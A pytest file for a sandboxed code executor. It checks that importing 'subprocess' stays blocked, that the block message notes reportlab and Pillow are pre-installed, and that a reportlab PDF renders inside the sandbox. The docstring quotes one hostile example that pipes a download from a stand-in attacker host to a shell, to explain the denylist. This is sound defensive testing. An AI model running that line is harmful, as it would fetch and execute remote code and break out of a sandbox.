

"""
Sev-1 #795 — subprocess block must not break legitimate reportlab PDF flow.

Background
----------
The model has been writing `import subprocess` at the top of synth-generated
PDF code on the (incorrect) assumption that reportlab needs to shell out to
`apt-get install libpango...` before it can render. That import is rejected
by `CodeValidator` because `subprocess` is on the BLOCKED_MODULES denylist.

The right fix is **Option B**: keep `subprocess` BLOCKED (allowing it would
hand the sandboxed program a path to fork arbitrary binaries — direct
container escape vector), and instead:

  1. Guarantee the image already has reportlab + Pillow pre-installed with
     all native deps baked in so user code never has to install anything
     at runtime.
  2. Make the block error message *helpful* — when the model sees
     "subprocess is blocked" it should know that reportlab/Pillow/etc.
     are pre-installed and that no shelling-out is needed.
  3. Prove via TDD that the canonical reportlab PDF flow (the actual user
     intent) passes validation AND actually produces a valid PDF when run
     through the sandbox wrapper.

Security
--------
`subprocess` STAYS BLOCKED. The premise that reportlab needs subprocess.run
to bootstrap pango is incorrect for the standard
`canvas.Canvas('/tmp/x.pdf').save()` path — that's pure-Python.
Allowing subprocess would let a hostile prompt write
`subprocess.run(['curl', 'attacker.example.com|sh'])` and trivially break
out of the sandbox boundary the rest of the executor is enforcing.
"""

from __future__ import annotations

import json
import subprocess as host_subprocess  # for shelling out to the wrapper in test
import sys
import tempfile
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# 1) Validator-level contract: subprocess STAYS blocked
# ---------------------------------------------------------------------------

def test_subprocess_remains_blocked_top_level_import() -> None:
    """`import subprocess` is still a hard reject. NEVER unblock."""
    from synth_executor.executor import CodeValidator
    v = CodeValidator(["file_processing"])
    ok, err = v.validate("import subprocess")
    assert ok is False
    assert err is not None
    assert "subprocess" in err.lower()

def test_subprocess_remains_blocked_from_import() -> None:
    """`from subprocess import run` is still a hard reject."""
    from synth_executor.executor import CodeValidator
    v = CodeValidator(["file_processing"])
    ok, err = v.validate("from subprocess import run")
    assert ok is False
    assert err is not None
    assert "subprocess" in err.lower()

def test_subprocess_block_error_is_helpful() -> None:
    """
    The error must hint that the libs are pre-installed so the model
    course-corrects on retry instead of looping with the same import.
    """
    from synth_executor.executor import CodeValidator
    v = CodeValidator(["file_processing"])
    ok, err = v.validate("import subprocess")
    assert ok is False
    assert err is not None
    # Must mention that libs are pre-installed (course-correct hint).
    msg = err.lower()
    assert "pre-installed" in msg or "preinstalled" in msg or "already installed" in msg, (
        f"Expected the block error to hint that libs are pre-installed, got: {err!r}"
    )

# ---------------------------------------------------------------------------
# 2) The canonical reportlab path passes validation (no subprocess needed)
# ---------------------------------------------------------------------------

REPORTLAB_PDF_SNIPPET = """
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

def execute(ctx):
    out_path = '/tmp/synth-output/report.pdf'
    import os
    os.makedirs('/tmp/synth-output', exist_ok=True)
    c = canvas.Canvas(out_path, pagesize=letter)
    c.drawString(72, 720, 'Hello from synth-executor')
    c.save()
    return {'pdf_path': out_path}
"""

def test_canonical_reportlab_snippet_passes_validation() -> None:
    """The user-intent path (no subprocess) must validate clean."""
    from synth_executor.executor import CodeValidator
    v = CodeValidator(["file_processing"])
    ok, err = v.validate(REPORTLAB_PDF_SNIPPET)
    assert ok is True, f"Expected pass, got error: {err}"

# ---------------------------------------------------------------------------
# 3) End-to-end: reportlab actually renders a PDF inside the sandbox
#    wrapper — the proof that Option B (pre-bake deps, no subprocess) works.
# ---------------------------------------------------------------------------

def test_reportlab_pdf_renders_via_sandbox_wrapper(tmp_path: Path) -> None:
    """
    Run the sandbox wrapper as a real subprocess (the same way the
    executor does at runtime) and feed it the reportlab snippet via
    stdin. Assert the wrapper exits clean, emits the __SYNTH_RESULT__
    sentinel with success=True, and that a real PDF file ends up on
    disk.
    """
    from synth_executor.executor import SANDBOX_WRAPPER

    wrapper = tmp_path / "wrapper.py"
    wrapper.write_text(SANDBOX_WRAPPER)

    out_dir = tmp_path / "synth-output"
    out_dir.mkdir()
    pdf_path = out_dir / "report.pdf"

    # Snippet writes to a controlled tmp path so the test is hermetic.
    snippet = f"""
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

def execute(ctx):
    out_path = {str(pdf_path)!r}
    c = canvas.Canvas(out_path, pagesize=letter)
    c.drawString(72, 720, 'Hello from synth-executor')
    c.save()
    return {{'pdf_path': out_path}}
"""

    cfg = {"code": snippet, "timeout_seconds": 20, "max_memory_mb": 256}

    proc = host_subprocess.run(
        [sys.executable, str(wrapper)],
        input=(json.dumps(cfg) + "\n").encode(),
        capture_output=True,
        timeout=30,
        # RLIMIT_NPROC=0 in the wrapper would prevent any further forking
        # inside the snippet; reportlab does not fork so this is fine.
    )

    stdout = proc.stdout.decode("utf-8", errors="replace")
    stderr = proc.stderr.decode("utf-8", errors="replace")

    sentinel = "__SYNTH_RESULT__"
    payload_line = next(
        (ln for ln in stdout.splitlines() if ln.startswith(sentinel)),
        None,
    )
    assert payload_line, (
        f"sandbox wrapper produced no __SYNTH_RESULT__ line.\n"
        f"stdout={stdout!r}\nstderr={stderr!r}"
    )
    payload = json.loads(payload_line[len(sentinel):])
    assert payload.get("success") is True, f"sandbox failed: {payload!r}"
    assert pdf_path.exists() and pdf_path.stat().st_size > 0, (
        f"no PDF produced at {pdf_path}"
    )
    # PDF magic bytes.
    assert pdf_path.read_bytes()[:4] == b"%PDF", "not a valid PDF"

# ---------------------------------------------------------------------------
# 4) Dockerfile regression: reportlab + Pillow must stay pre-installed.
#    The whole Option-B story rests on these wheels being in the image.
# ---------------------------------------------------------------------------

def test_requirements_pins_reportlab_and_pillow() -> None:
    """
    The base image bakes reportlab + Pillow so user code NEVER has to
    shell out to install them. If someone rips these out of
    requirements.txt the subprocess-block fix becomes a regression.
    """
    req = (
        Path(__file__).resolve().parent.parent / "requirements.txt"
    ).read_text()
    assert "reportlab==" in req, "reportlab must be pinned in requirements.txt"
    assert "Pillow==" in req or "pillow==" in req, (
        "Pillow must be pinned in requirements.txt (reportlab graphics dep)"
    )
